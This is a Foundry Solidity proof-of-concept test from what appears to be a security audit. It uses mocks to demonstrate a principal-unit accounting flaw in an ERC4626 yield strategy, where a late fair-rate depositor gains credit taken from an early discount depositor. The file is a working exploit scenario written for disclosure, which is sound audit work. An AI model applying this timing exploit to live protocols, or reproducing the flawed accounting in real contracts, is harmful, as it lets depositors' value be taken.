// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol";
import "../src/mocks/MockERC20.sol";
import "./mocks/MockERC4626Vault.sol";
import "./mocks/MockAMMAdapter.sol";

/**
 * @title PoC_H02_PrincipalUnitMismatchDilutesEarlyDepositors
 * @notice Proof of Concept for finding H-03
 *
 * @dev Vulnerability Location:
 *      src/concreteYieldStrategies/ERC4626MarketYieldStrategy.sol:273-291 (_depositInternal)
 *
 * VULNERABILITY SUMMARY:
 *   _depositInternal records principal in UNDERLYING units (the depositor's input `amount`),
 *   not in the actual number of vault shares received from the AMM swap. The AMM swap rate
 *   varies independently of the vault's internal share price, so two depositors who put in
 *   the same `amount` of underlying can end up with different numbers of vault shares.
 *
 *   `totalBalanceOf` then distributes the strategy's total vault value pro-rata by
 *   `principal / totalDeposited`, which weights both depositors equally despite the unequal
 *   share contributions. This breaks pro-rata yield distribution and creates a
 *   sandwich-style timing exploit:
 *
 *   - A late depositor coming in at FAIR rate AFTER an early deposit at a DISCOUNT rate
 *     dilutes the early depositor's gains, since the late depositor's smaller share
 *     contribution is weighted equally with the early depositor's larger share contribution.
 *
 * ATTACK / DILUTION PATH:
 *   1. T0: AMM is dislocated -- vault shares trade at a discount (1.25 shares per underlying).
 *   2. Alice (early discount depositor) deposits 1000 underlying via the strategy.
 *      AMM gives her position 1250 vault shares.
 *      clientBalances[Alice] = 1000, totalDeposited = 1000.
 *   3. T1: AMM normalizes back to fair rate (1.0 shares per underlying).
 *   4. Bob (late fair-rate depositor) deposits 1000 underlying via the strategy.
 *      AMM gives his position 1000 vault shares.
 *      clientBalances[Bob] = 1000, totalDeposited = 2000.
 *   5. Strategy now holds 2250 vault shares whose true value (at the post-T1 price) is
 *      2250 underlying.
 *   6. totalBalanceOf for each:
 *        Alice = 2250 * 1000/2000 = 1125
 *        Bob   = 2250 * 1000/2000 = 1125
 *      Both credited equally despite Alice having contributed 1250 underlying of
 *      true value and Bob having contributed only 1000.
 *
 *   Result: Bob (late fair-rate depositor) has ~125 of unearned credit; Alice (early
 *   discount depositor) has been silently diluted by ~125. The protocol's intended
 *   pro-rata yield distribution is broken.
 */
contract PoC_H02_PrincipalUnitMismatchDilutesEarlyDepositors is Test {
    ERC4626MarketYieldStrategy strategy;
    MockERC20 underlyingToken;
    MockERC4626Vault erc4626Vault;
    MockAMMAdapter ammAdapter;

    address owner = address(0x1234);
    address client = address(0x5678);
    address alice = address(0xA11CE); // Early discount depositor (the victim)
    address bob = address(0xB0B);     // Late fair-rate depositor (the attacker)

    // Use a large supply so we can fund the AMM with extra vault shares for
    // favorable-rate swaps without running out of reserves.
    uint256 constant INITIAL_TOKEN_SUPPLY = 10_000_000e18;

    function setUp() public {
        // Deploy mock tokens
        underlyingToken = new MockERC20("Underlying", "UNDERLYING", 18);

        // Deploy mock ERC4626 vault
        erc4626Vault = new MockERC4626Vault("Vault Shares", "vUNDERLYING", address(underlyingToken));

        // Deploy mock AMM adapter
        ammAdapter = new MockAMMAdapter();

        // Deploy strategy
        vm.prank(owner);
        strategy = new ERC4626MarketYieldStrategy(
            owner, address(underlyingToken), address(erc4626Vault), address(ammAdapter)
        );

        // Default 1:1 AMM rates (overridden during the scenario)
        ammAdapter.setExchangeRate(address(underlyingToken), address(erc4626Vault), 1e18);
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 1e18);

        // Mint underlying to client (which will be the depositor on behalf of alice/bob)
        underlyingToken.mint(client, INITIAL_TOKEN_SUPPLY);

        // Fund the AMM adapter with vault shares so it can deliver them to the strategy
        // during deposit swaps. We need extra reserves because at the discount rate the
        // AMM gives MORE shares per underlying than 1:1, so the standard supply may not
        // be enough on its own. Mint twice the supply, then deposit it into the vault on
        // behalf of the AMM adapter.
        underlyingToken.mint(address(this), INITIAL_TOKEN_SUPPLY * 2);
        underlyingToken.approve(address(erc4626Vault), INITIAL_TOKEN_SUPPLY * 2);
        erc4626Vault.deposit(INITIAL_TOKEN_SUPPLY * 2, address(ammAdapter));

        // Fund the AMM adapter with underlying tokens for any reverse swaps
        underlyingToken.mint(address(ammAdapter), INITIAL_TOKEN_SUPPLY);

        // Authorize the client and set a generous slippage tolerance so the discount
        // deposit comfortably passes the slippage check (the strategy computes minOut
        // from convertToShares; at a 1.25x AMM rate the AMM gives MORE shares than the
        // ideal, so we don't actually need slippage tolerance for that direction --
        // but a non-zero tolerance is still required for normal operation).
        vm.startPrank(owner);
        strategy.setClient(client, true);
        strategy.setSlippageTolerance(5000); // 50% tolerance, well within MAX_BPS
        vm.stopPrank();

        // Approve strategy to spend client's tokens
        vm.prank(client);
        underlyingToken.approve(address(strategy), type(uint256).max);
    }

    /**
     * @notice Demonstrates that a late fair-rate depositor dilutes an early discount
     *         depositor because principal is tracked in underlying units while shares
     *         are bought at variable AMM rates.
     */
    function test_LateFairRateDepositorDilutesEarlyDiscountDepositor() public {
        uint256 depositAmount = 1000e18;

        // ===================== STEP 1: T0 -- AMM dislocated (discount on vault shares) =====================
        // Set AMM rate so that 1 underlying buys 1.25 vault shares.
        // The vault's internal price is unchanged (still 1:1 underlying:share).
        ammAdapter.setExchangeRate(address(underlyingToken), address(erc4626Vault), 1.25e18);
        // Reverse rate at this snapshot (not actually used for withdrawal in this test,
        // but kept consistent for clarity)
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 0.8e18);

        console.log("=== T0: AMM dislocated, vault shares at a discount (1.25 shares per underlying) ===");

        // ===================== STEP 2: Alice deposits 1000 at the discount =====================
        uint256 sharesBeforeAlice = erc4626Vault.balanceOf(address(strategy));

        vm.prank(client);
        strategy.deposit(address(underlyingToken), depositAmount, alice);

        uint256 sharesAfterAlice = erc4626Vault.balanceOf(address(strategy));
        uint256 aliceSharesAcquired = sharesAfterAlice - sharesBeforeAlice;

        console.log("Alice deposited 1000 underlying.");
        console.log("Alice's shares acquired (via AMM):", aliceSharesAcquired);
        console.log("Alice's tracked principal (underlying units):", strategy.principalOf(address(underlyingToken), alice));

        // Sanity: at the 1.25x AMM rate Alice got 1250 vault shares
        assertEq(aliceSharesAcquired, 1250e18, "Alice should have acquired 1250 vault shares");
        // Principal is recorded in underlying units, not share units
        assertEq(strategy.principalOf(address(underlyingToken), alice), depositAmount, "Alice principal in underlying units");

        // ===================== STEP 3: T1 -- AMM normalizes back to fair rate =====================
        ammAdapter.setExchangeRate(address(underlyingToken), address(erc4626Vault), 1e18);
        ammAdapter.setExchangeRate(address(erc4626Vault), address(underlyingToken), 1e18);

        console.log("");
        console.log("=== T1: AMM normalizes back to fair rate (1.0 shares per underlying) ===");

        // ===================== STEP 4: Bob deposits 1000 at the fair rate =====================
        uint256 sharesBeforeBob = erc4626Vault.balanceOf(address(strategy));

        vm.prank(client);
        strategy.deposit(address(underlyingToken), depositAmount, bob);

        uint256 sharesAfterBob = erc4626Vault.balanceOf(address(strategy));
        uint256 bobSharesAcquired = sharesAfterBob - sharesBeforeBob;

        console.log("Bob deposited 1000 underlying.");
        console.log("Bob's shares acquired (via AMM):", bobSharesAcquired);
        console.log("Bob's tracked principal (underlying units):", strategy.principalOf(address(underlyingToken), bob));

        // Sanity: at the 1.0x AMM rate Bob got 1000 vault shares
        assertEq(bobSharesAcquired, 1000e18, "Bob should have acquired 1000 vault shares");
        assertEq(strategy.principalOf(address(underlyingToken), bob), depositAmount, "Bob principal in underlying units");

        // ===================== STEP 5: Verify aggregate state =====================
        uint256 totalSharesHeld = erc4626Vault.balanceOf(address(strategy));
        uint256 totalDeposited = strategy.getTotalDeposited(address(underlyingToken));

        console.log("");
        console.log("=== Aggregate state ===");
        console.log("Total vault shares held by strategy:", totalSharesHeld);
        console.log("Total deposited (sum of principals):", totalDeposited);

        assertEq(totalSharesHeld, 2250e18, "Strategy should hold 2250 shares total");
        assertEq(totalDeposited, 2 * depositAmount, "Total deposited should be 2000 underlying");

        // ===================== STEP 6: Compute true value vs. tracked totalBalanceOf =====================
        // True value of each depositor's actual share contribution, measured at the
        // post-T1 fair price (1 share = 1 underlying):
        //   Alice's true value = 1250 (she acquired 1250 shares at the discount)
        //   Bob's true value   = 1000 (he acquired 1000 shares at the fair rate)
        uint256 aliceTrueValue = erc4626Vault.convertToAssets(aliceSharesAcquired);
        uint256 bobTrueValue = erc4626Vault.convertToAssets(bobSharesAcquired);

        // Tracked balance per the protocol's pro-rata formula
        uint256 aliceTrackedBalance = strategy.totalBalanceOf(address(underlyingToken), alice);
        uint256 bobTrackedBalance = strategy.totalBalanceOf(address(underlyingToken), bob);

        console.log("");
        console.log("=== Per-depositor accounting ===");
        console.log("Alice true value (convertToAssets of her shares):", aliceTrueValue);
        console.log("Alice tracked totalBalanceOf:                    ", aliceTrackedBalance);
        console.log("Bob   true value (convertToAssets of his shares):", bobTrueValue);
        console.log("Bob   tracked totalBalanceOf:                    ", bobTrackedBalance);

        // Sanity: true values match expectations
        assertEq(aliceTrueValue, 1250e18, "Alice's 1250 shares should be worth 1250 underlying at fair price");
        assertEq(bobTrueValue, 1000e18, "Bob's 1000 shares should be worth 1000 underlying at fair price");

        // The protocol's pro-rata formula gives BOTH depositors the same balance
        // (2250 * 1000 / 2000 = 1125), regardless of how many shares each actually
        // contributed.
        assertEq(aliceTrackedBalance, 1125e18, "Alice tracked balance should be 1125 (the diluted average)");
        assertEq(bobTrackedBalance, 1125e18, "Bob tracked balance should be 1125 (the diluted average)");

        // ===================== STEP 7: Assert imbalance in OPPOSITE directions =====================
        // The bug manifests as a systematic transfer of value from the early discount
        // depositor (Alice) to the late fair-rate depositor (Bob): Alice's tracked balance
        // is LESS than her true value, and Bob's tracked balance is MORE than his true
        // value, by the same magnitude.

        // Alice was diluted: tracked < true
        assertLt(aliceTrackedBalance, aliceTrueValue, "Alice tracked balance should be LESS than her true contribution");
        uint256 aliceLoss = aliceTrueValue - aliceTrackedBalance;

        // Bob was unjustly enriched: tracked > true
        assertGt(bobTrackedBalance, bobTrueValue, "Bob tracked balance should be GREATER than his true contribution");
        uint256 bobGain = bobTrackedBalance - bobTrueValue;

        // The directions are opposite, and the magnitudes are equal (zero-sum transfer)
        assertGt(aliceLoss, 0, "Alice's loss must be strictly positive");
        assertGt(bobGain, 0, "Bob's gain must be strictly positive");
        assertEq(aliceLoss, bobGain, "Alice's loss equals Bob's gain (zero-sum dilution)");

        // Quantify the magnitude
        assertEq(aliceLoss, 125e18, "Alice loses 125 underlying of credit");
        assertEq(bobGain, 125e18, "Bob gains 125 underlying of unearned credit");

        console.log("");
        console.log("=== Vulnerability impact ===");
        console.log("Alice (early discount depositor) loss in tracked credit:", aliceLoss);
        console.log("Bob   (late fair-rate depositor) unearned gain:         ", bobGain);
        console.log("Loss == Gain (zero-sum dilution): TRUE");
        console.log("");
        console.log("=== H-03 CONFIRMED: principal-in-underlying-units accounting silently");
        console.log("    redistributes value from early discount depositors to late");
        console.log("    fair-rate depositors, breaking pro-rata yield distribution. ===");
    }
}
